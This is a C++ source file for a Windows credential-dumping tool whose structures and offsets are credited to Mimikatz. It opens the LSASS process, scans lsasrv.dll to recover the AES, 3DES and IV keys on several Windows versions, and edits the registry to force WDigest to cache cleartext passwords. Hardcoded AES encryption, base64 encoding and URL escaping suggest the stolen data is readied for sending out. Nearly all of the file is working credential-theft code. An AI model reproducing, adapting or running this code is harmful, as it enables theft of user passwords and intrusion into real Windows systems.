
#define SECURITY_WIN32

#include <windows.h>
#include <psapi.h>
#include <string>
#include <ntsecapi.h>
#include <sspi.h>
#include <sddl.h>
#include <wincred.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>
#include <stdio.h>
#include <bcrypt.h>
#include <ntstatus.h>
#include <tlhelp32.h>
#include <ctime>
#include <tchar.h>
#include <winhttp.h>
#include "EdurlParser.h"
#include <iostream>
#include <typeinfo>
#include <algorithm>
#include <stdexcept>

#include "AES.h"
#include "Base64.h"
 


using namespace std;



#pragma comment(lib,"Bcrypt.lib") 
#pragma comment(lib,"psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment (lib,"winhttp.lib")
#pragma warning(disable:4996)


//** Offsets and Structs credited to Mimikatz **/




const char g_key[17] = "ooo00iiiIIIlllii";
const char g_iv[17] = "zzzzZZZZTTTTLLLL";

typedef struct _KIWI_WDIGEST_LIST_ENTRY {
	struct _KIWI_WDIGEST_LIST_ENTRY* Flink;
	struct _KIWI_WDIGEST_LIST_ENTRY* Blink;
	ULONG	UsageCount;
	struct _KIWI_WDIGEST_LIST_ENTRY* This;
	LUID LocallyUniqueIdentifier;

	UNICODE_STRING UserName; // 0x30
	UNICODE_STRING Domaine;  // 0x40
	UNICODE_STRING Password; // 0x50
} KIWI_WDIGEST_LIST_ENTRY, *PKIWI_WDIGEST_LIST_ENTRY;

typedef struct _KIWI_HARD_KEY {
	ULONG cbSecret;
	BYTE data[60]; // etc...
} KIWI_HARD_KEY, *PKIWI_HARD_KEY;


typedef struct _KIWI_BCRYPT_KEY {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG bits;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY, *PKIWI_BCRYPT_KEY;

typedef struct _KIWI_BCRYPT_KEY81 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	ULONG unk3;
	ULONG unk4;
	PVOID unk5;	// before, align in x64
	ULONG unk6;
	ULONG unk7;
	ULONG unk8;
	ULONG unk9;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, *PKIWI_BCRYPT_KEY81;

typedef struct _KIWI_BCRYPT_HANDLE_KEY {
	ULONG size;
	ULONG tag;	// 'UUUR'
	PVOID hAlgorithm;
	PKIWI_BCRYPT_KEY81 key;
	PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, *PKIWI_BCRYPT_HANDLE_KEY;

// Signature used to find l_LogSessList (PTRN_WIN6_PasswdSet from Mimikatz)
unsigned char logSessListSig[] = { 0x48, 0x3b, 0xd9, 0x74 };


#define USERNAME_OFFSET 0x30
#define HOSTNAME_OFFSET 0x40
#define PASSWORD_OFFSET 0x50

//* End structs and offsets *//

// Holds extracted InitializationVector
unsigned char gInitializationVector[16];

// Holds extracted 3DES key
unsigned char gDesKey[24];

// Holds extracted AES key
unsigned char gAesKey[16];
//char * pt="C:\\ProgramData\\Mcafee_dump_1203.tmp";



//char * fpath=pt"aaaa";

// Decrypt wdigest cached credentials using AES or 3Des 

string EncryptionAES(const string& strSrc) //AES����
{
	size_t length = strSrc.length();
	int block_num = length / BLOCK_SIZE + 1;
	//����
	char* szDataIn = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataIn, 0x00, block_num * BLOCK_SIZE + 1);
	strcpy(szDataIn, strSrc.c_str());
 
	//����PKCS7Padding��䡣
	int k = length % BLOCK_SIZE;
	int j = length / BLOCK_SIZE;
	int padding = BLOCK_SIZE - k;
	for (int i = 0; i < padding; i++)
	{
		szDataIn[j * BLOCK_SIZE + k + i] = padding;
	}
	szDataIn[block_num * BLOCK_SIZE] = '\0';
 
	//���ܺ������
	char *szDataOut = new char[block_num * BLOCK_SIZE + 1];
	memset(szDataOut, 0, block_num * BLOCK_SIZE + 1);
 
	//���н���AES��CBCģʽ����
	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Encrypt(szDataIn, szDataOut, block_num * BLOCK_SIZE, AES::CBC);
	string str = base64_encode((unsigned char*) szDataOut,
			block_num * BLOCK_SIZE);
	delete[] szDataIn;
	delete[] szDataOut;
	return str;
}

void UseLogonCredential()
{
	long	lRet;
	HKEY	hKey;
	DWORD	WDigest;
	DWORD	dwType = REG_DWORD;
	DWORD	dwValue;
	DWORD	dwuC = 1;
	lRet = RegOpenKeyEx(
		HKEY_LOCAL_MACHINE,
		_T( "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" ),
		0,
		KEY_QUERY_VALUE | KEY_SET_VALUE,
		&hKey
		);                     
	if ( lRet == ERROR_SUCCESS )   
	{
		lRet = RegQueryValueEx(
			hKey,
			_T( "UseLogonCredential" ),
			0,
			&dwType,
			(LPBYTE) &WDigest,
			&dwValue
			); 

		//�����ڸü����޸�
		
		if ( lRet != 2 && WDigest != 1 )
		{
		
			printf( "[*] Manipulating Windows Registry to force WDigest use.\n" );
			lRet = RegSetValueEx( hKey, _T( "UseLogonCredential" ), 0, REG_DWORD, (BYTE *) &dwuC, sizeof(DWORD) );
			/*if ( lRet != 0 )
			{
				_tprintf( TEXT( "\nRegSetValueEx failed with error %u\n" ), lRet );
			}*/
		}
        //if(WDigest == 1){
        //    
        //    printf( "[*] Manipulating Windows Registry to force WDigest use.\r\n" );

        //}
	}
    RegCloseKey(hKey);
}
ULONG DecryptCredentials(char* encrypedPass, DWORD encryptedPassLen,unsigned char * decryptedPass, ULONG decryptedPassLen) {
	BCRYPT_ALG_HANDLE hProvider, hDesProvider;
	BCRYPT_KEY_HANDLE hAes, hDes;
	ULONG result;
	NTSTATUS status;
	unsigned char initializationVector[16];

	// Same IV used for each cred, so we need to work on a local copy as this is updated
	// each time by BCryptDecrypt
	memcpy(initializationVector, gInitializationVector, sizeof(gInitializationVector));

	if (encryptedPassLen % 8) {
		// If suited to AES, lsasrv uses AES in CFB mode
		//printf("[-->] AES\n");
		BCryptOpenAlgorithmProvider(&hProvider, BCRYPT_AES_ALGORITHM, NULL, 0);
		BCryptSetProperty(hProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);
		BCryptGenerateSymmetricKey(hProvider, &hAes, NULL, 0, gAesKey, sizeof(gAesKey), 0);
		status = BCryptDecrypt(hAes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, sizeof(gInitializationVector), decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		}
		return result;
	}
	else {
		// If suited to 3DES, lsasrv uses 3DES in CBC mode
		//printf("[-->] 3DES\n");
		BCryptOpenAlgorithmProvider(&hDesProvider, BCRYPT_3DES_ALGORITHM, NULL, 0);
		BCryptSetProperty(hDesProvider, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
		BCryptGenerateSymmetricKey(hDesProvider, &hDes, NULL, 0, gDesKey, sizeof(gDesKey), 0);
		status = BCryptDecrypt(hDes, (PUCHAR)encrypedPass, encryptedPassLen, 0, initializationVector, 8, decryptedPass, decryptedPassLen, &result, 0);
		if (status != 0) {
			return 0;
		
		}
		return result;
	}
}


string DecryptionAES(const string& strSrc) //AES����
{
	string strData = base64_decode(strSrc);
	size_t length = strData.length();

	char *szDataIn = new char[length + 1];
	memcpy(szDataIn, strData.c_str(), length+1);

	char *szDataOut = new char[length + 1];
	memcpy(szDataOut, strData.c_str(), length+1);
 

	AES aes;
	aes.MakeKey(g_key, g_iv, 16, 16);
	aes.Decrypt(szDataIn, szDataOut, length, AES::CBC);
 
	if (0x00 < szDataOut[length - 1] <= 0x16)
	{
		int tmp = szDataOut[length - 1];
		for (int i = length - 1; i >= length - tmp; i--)
		{
			if (szDataOut[i] != tmp)
			{
				memset(szDataOut, 0, length);
				break;
			}
			else
				szDataOut[i] = 0;
		}
	}
	string strDest(szDataOut);
	delete[] szDataIn;
	delete[] szDataOut;
	return strDest;
}

// Read memory from LSASS process
SIZE_T ReadFromLsass(HANDLE hLsass, void* addr, void *memOut, int memOutLen) {
	SIZE_T bytesRead = 0;

	memset(memOut, 0, memOutLen);
	ReadProcessMemory(hLsass, addr, memOut, memOutLen, &bytesRead);

	return bytesRead;
}

// Open a handle to the LSASS process
HANDLE GrabLsassHandle(int pid) {
	HANDLE procHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
	return procHandle;
}

// Searches for a provided pattern in memory and returns the offset
DWORD SearchPattern(unsigned char* mem, unsigned char* signature, DWORD signatureLen) {
	ULONG offset = 0;

	// Hunt for signature locally to avoid a load of RPM calls
	for (int i = 0; i < 0x200000; i++) {
		if (*(unsigned char*)(mem + i) == signature[0] && *(unsigned char*)(mem + i + 1) == signature[1]) {
			if (memcmp(mem + i, signature, signatureLen) == 0) {
				// Found the signature
				offset = i;
				break;
			}
		}
	}

	return offset;
}

// Recoveres AES, 3DES and IV from lsass memory required to decrypt wdigest credentials
int FindKeysOnWin7(HANDLE hLsass, char* lsasrvMem) {
	BYTE PTRN_WNO8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d };
	int IV_OFFSET = 59;
	int DES_OFFSET = -61;
	int AES_OFFSET = 25;

	DWORD keySigOffset = 0;
	DWORD ivOffset = 0;
	DWORD desOffset = 0, aesOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey, hAesKey;
	KIWI_BCRYPT_KEY extracted3DesKey, extractedAesKey;
	void* keyPointer = NULL;

	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
	unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
	if (lsasrvLocal == (unsigned char*)0) {
		printf("[x] Error: Could not load lsasrv.dll locally\n");
		return 1;
	}
	printf("[*] Loaded lsasrv.dll locally at address %p\n", lsasrvLocal);

	// Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
	keySigOffset = SearchPattern(lsasrvLocal, PTRN_WNO8_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WNO8_LsaInitializeProtectedMemory_KEY));
	if (keySigOffset == 0) {
		printf("[x] Error: Could not find offset to AES/3Des/IV keys\n");
		return 1;
	}
	printf("[*] Found offset to AES/3Des/IV at %d\n", keySigOffset);

	// Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET, (char*)&ivOffset, 4);
	printf("[*] InitializationVector offset found as %d\n", ivOffset);

	// Read InitializationVector (16 bytes)
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET + 4 + ivOffset, gInitializationVector, 16);

	printf("[*] InitializationVector recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	for (int i = 0; i < 16; i++) {
		printf("%02x ", gInitializationVector[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET, &desOffset, 4);
	printf("[*] h3DesKey offset found as %d\n", desOffset);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET + 4 + desOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in the 3DES key
	ReadFromLsass(hLsass, h3DesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] 3Des Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gDesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gDesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET, &aesOffset, 4);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET + 4 + aesOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in AES key
	ReadFromLsass(hLsass, hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] Aes Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gAesKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extractedAesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gAesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	return 0;
}


// Recoveres AES, 3DES and IV from lsass memory required to decrypt wdigest credentials
int FindKeysOnWin8(HANDLE hLsass, char* lsasrvMem) {
	BYTE PTRN_WIN8_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
	int IV_OFFSET = 62;
	int DES_OFFSET = -70;
	int AES_OFFSET = 23;

	DWORD keySigOffset = 0;
	DWORD ivOffset = 0;
	DWORD desOffset = 0, aesOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey, hAesKey;
	KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
	void* keyPointer = NULL;

	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
	unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
	if (lsasrvLocal == (unsigned char*)0) {
		printf("[x] Error: Could not load lsasrv.dll locally\n");
		return 1;
	}
	printf("[*] Loaded lsasrv.dll locally at address %p\n", lsasrvLocal);

	// Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
	keySigOffset = SearchPattern(lsasrvLocal, PTRN_WIN8_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WIN8_LsaInitializeProtectedMemory_KEY));
	if (keySigOffset == 0) {
		printf("[x] Error: Could not find offset to AES/3Des/IV keys\n");
		return 1;
	}
	printf("[*] Found offset to AES/3Des/IV at %d\n", keySigOffset);

	// Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET, (char*)&ivOffset, 4);
	printf("[*] InitializationVector offset found as %d\n", ivOffset);

	// Read InitializationVector (16 bytes)
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET + 4 + ivOffset, gInitializationVector, 16);

	printf("[*] InitializationVector recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	for (int i = 0; i < 16; i++) {
		printf("%02x ", gInitializationVector[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET, &desOffset, 4);
	printf("[*] h3DesKey offset found as %d\n", desOffset);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET + 4 + desOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in the 3DES key
	ReadFromLsass(hLsass, h3DesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] 3Des Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gDesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gDesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET, &aesOffset, 4);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET + 4 + aesOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in AES key
	ReadFromLsass(hLsass, hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] Aes Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gAesKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extractedAesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gAesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	return 0;
}

// Recoveres AES, 3DES and IV from lsass memory required to decrypt wdigest credentials
// before Win10_1903
int FindKeysOnWin10(HANDLE hLsass, char* lsasrvMem) {
	BYTE PTRN_WN10_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
	int IV_OFFSET = 61;
	int DES_OFFSET = -73;
	int AES_OFFSET = 16;

	DWORD keySigOffset = 0;
	DWORD ivOffset = 0;
	DWORD desOffset = 0, aesOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey, hAesKey;
	KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
	void* keyPointer = NULL;

	// Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
	unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
	if (lsasrvLocal == (unsigned char*)0) {
		printf("[x] Error: Could not load lsasrv.dll locally\n");
		return 1;
	}
	printf("[*] Loaded lsasrv.dll locally at address %p\n", lsasrvLocal);

	// Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
	keySigOffset = SearchPattern(lsasrvLocal, PTRN_WN10_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_LsaInitializeProtectedMemory_KEY));
	if (keySigOffset == 0) {
		printf("[x] Error: Could not find offset to AES/3Des/IV keys\n");
		return 1;
	}
	printf("[*] Found offset to AES/3Des/IV at %d\n", keySigOffset);

	// Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET, (char*)&ivOffset, 4);
	printf("[*] InitializationVector offset found as %d\n", ivOffset);

	// Read InitializationVector (16 bytes)
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET + 4 + ivOffset, gInitializationVector, 16);

	printf("[*] InitializationVector recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	for (int i = 0; i < 16; i++) {
		printf("%02x ", gInitializationVector[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET, &desOffset, 4);
	printf("[*] h3DesKey offset found as %d\n", desOffset);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET + 4 + desOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in the 3DES key
	ReadFromLsass(hLsass, h3DesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] 3Des Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gDesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gDesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	// Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET, &aesOffset, 4);

	// Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
	ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET + 4 + aesOffset, &keyPointer, sizeof(char*));

	// Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
	ReadFromLsass(hLsass, keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// Read in AES key
	ReadFromLsass(hLsass, hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY));

	printf("[*] Aes Key recovered as:\n");
	printf("[*] ====[ Start ]====\n[*] ");
	memcpy(gAesKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
	for (unsigned int i = 0; i < extractedAesKey.hardkey.cbSecret; i++) {
		printf("%02x ", gAesKey[i]);
	}
	printf("\n[*] ====[ End ]===\n");

	return 0;
}

int FindKeysOnWin10_1903(HANDLE hLsass, char* lsasrvMem) {
    BYTE PTRN_WN10_1903_LsaInitializeProtectedMemory_KEY[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
    int IV_OFFSET = 67;
    int DES_OFFSET = -89;
    int AES_OFFSET = 16;

    DWORD keySigOffset = 0;
    DWORD ivOffset = 0;
    DWORD desOffset = 0, aesOffset = 0;
    KIWI_BCRYPT_HANDLE_KEY h3DesKey, hAesKey;
    KIWI_BCRYPT_KEY81 extracted3DesKey, extractedAesKey;
    void* keyPointer = NULL;

    // Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
    unsigned char *lsasrvLocal = (unsigned char*)LoadLibraryA("lsasrv.dll");
    if (lsasrvLocal == (unsigned char*)0) {
        printf("[x] Error: Could not load lsasrv.dll locally\n");
        return 1;
    }
    printf("[*] Loaded lsasrv.dll locally at address %p\n", lsasrvLocal);

    // Search for AES/3Des/IV signature within lsasrv.dll and grab the offset
    keySigOffset = SearchPattern(lsasrvLocal, PTRN_WN10_1903_LsaInitializeProtectedMemory_KEY, sizeof(PTRN_WN10_1903_LsaInitializeProtectedMemory_KEY));
    if (keySigOffset == 0) {
        printf("[x] Error: Could not find offset to AES/3Des/IV keys\n");
        return 1;
    }
    printf("[*] Found offset to AES/3Des/IV at %d\n", keySigOffset);

    // Retrieve offset to InitializationVector address due to "lea reg, [InitializationVector]" instruction
    ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET, (char*)&ivOffset, 4);
    printf("[*] InitializationVector offset found as %d\n", ivOffset);

    // Read InitializationVector (16 bytes)
    ReadFromLsass(hLsass, lsasrvMem + keySigOffset + IV_OFFSET + 4 + ivOffset, gInitializationVector, 16);

    printf("[*] InitializationVector recovered as:\n");
    printf("[*] ====[ Start ]====\n[*] ");
    for (int i = 0; i < 16; i++) {
        printf("%02x ", gInitializationVector[i]);
    }
    printf("\n[*] ====[ End ]===\n");

    // Retrieve offset to h3DesKey address due to "lea reg, [h3DesKey]" instruction
    ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET, &desOffset, 4);
    printf("[*] h3DesKey offset found as %d\n", desOffset);

    // Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
    ReadFromLsass(hLsass, lsasrvMem + keySigOffset + DES_OFFSET + 4 + desOffset, &keyPointer, sizeof(char*));

    // Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
    ReadFromLsass(hLsass, keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

    // Read in the 3DES key
    ReadFromLsass(hLsass, h3DesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY));

    printf("[*] 3Des Key recovered as:\n");
    printf("[*] ====[ Start ]====\n[*] ");
    memcpy(gDesKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
    for (unsigned int i = 0; i < extracted3DesKey.hardkey.cbSecret; i++) {
        printf("%02x ", gDesKey[i]);
    }
    printf("\n[*] ====[ End ]===\n");

    // Retrieve offset to hAesKey address due to "lea reg, [hAesKey]" instruction
    ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET, &aesOffset, 4);

    // Retrieve pointer to h3DesKey which is actually a pointer to KIWI_BCRYPT_HANDLE_KEY struct
    ReadFromLsass(hLsass, lsasrvMem + keySigOffset + AES_OFFSET + 4 + aesOffset, &keyPointer, sizeof(char*));

    // Read the KIWI_BCRYPT_HANDLE_KEY struct from lsass
    ReadFromLsass(hLsass, keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

    // Read in AES key
    ReadFromLsass(hLsass, hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY));

    printf("[*] Aes Key recovered as:\n");
    printf("[*] ====[ Start ]====\n[*] ");
    memcpy(gAesKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);
    for (unsigned int i = 0; i < extractedAesKey.hardkey.cbSecret; i++) {
        printf("%02x ", gAesKey[i]);
    }
    printf("\n[*] ====[ End ]===\n");

    return 0;
}

// Reads out a LSA_UNICODE_STRING from lsass address provided
UNICODE_STRING *ExtractUnicodeString(HANDLE hLsass, char* addr) {
	UNICODE_STRING *str;
	WORD* mem;

	str = (UNICODE_STRING*)LocalAlloc(LPTR, sizeof(UNICODE_STRING));

	// Read LSA_UNICODE_STRING from lsass memory
	ReadFromLsass(hLsass, addr, str, sizeof(UNICODE_STRING));

	mem = (WORD*)LocalAlloc(LPTR, str->MaximumLength);
	if (mem == (WORD*)0) {
		LocalFree(str);
		return NULL;
	}

	// Read the buffer contents for the LSA_UNICODE_STRING from lsass memory
	ReadFromLsass(hLsass, *(void**)((char*)str + 8), mem, str->MaximumLength);
	str->Buffer = (PWSTR)mem;
	return str;
}

// Free memory allocated within getUnicodeString
void FreeUnicodeString(UNICODE_STRING* unicode) {
	LocalFree(unicode->Buffer);
	LocalFree(unicode);
}


string urlEscape(const std::string& str, bool escapeReserved = true)
		{
			std::string ret;
			char buf[64];
			char c;

			for(std::string::size_type i = 0; i < str.length(); ++i)
			{
				c = str[i];

				if((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9'))
				{
					ret += c;
				}
				else
				{
					switch(c)
					{
					// unreserved, non-alanum chars
					case '-':
					case '_':
					case '.':
					case '~':
						{
							ret += c;
							break;
						}
					// reserved, optional
					case '!':
					case '*':
					case '\'':
					case '(':
					case ')':
					case ';':
					case ':':
					case '@':
					case '&':
					case '=':
					case '+':
					case '$':
					case ',':
					case '/':
					case '?':
					case '#':
					case '[':
					case ']':
						{
							if(escapeReserved == false)
							{
								ret += c;
								break;
							}
						}
					default:
						{
							sprintf(buf, "%%%02X", static_cast<unsigned char>(c));
							ret += buf;
						}
					}
				}
			}

			return ret;
		}


std::string wstrtostr(const std::wstring &wstr)
{
    std::string strTo;
    char *szTo = new char[wstr.length() + 1];
    szTo[wstr.size()] = '\0';
    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, szTo, (int)wstr.length(), NULL, NULL);
    strTo = szTo;
    delete[] szTo;
    return strTo;
}


void printSysError() {
    DWORD errId;
    TCHAR errMsg[256];
    TCHAR* p;

    errId = GetLastError();
    FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, 
                    NULL, errId, 
                    MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                    errMsg, 256, NULL);

    p = errMsg;
    while(*p > 31 || *p == 9) { ++p; }
    do { *p-- = 0; } while(p >= errMsg && (*p == '.' || *p < 33));
    _tprintf(TEXT("[Error %d] %s\n"), errId, errMsg);
}

char *UTF16ToChar(wchar_t *sString) {
    char *Result;
    unsigned int uiLen;
 
    if(!sString) {
        return NULL;
    }
    uiLen = WideCharToMultiByte(CP_ACP, 0, sString, -1, NULL, 0, NULL, NULL);
    if(uiLen < 1) {
        return NULL;
    }
    try {
        Result = new char[uiLen];
    }
    catch(...) {
        Result = NULL;
    }
    if(!Result) {
        return NULL;
    }
    uiLen = WideCharToMultiByte(CP_ACP, 0, sString, -1, Result, uiLen, NULL, NULL);
    if(uiLen < 1) {
        delete [] Result;
        Result = NULL;
    }
 
    return Result;
}

wstring s2ws(const std::string& s)
{
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0); 
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}
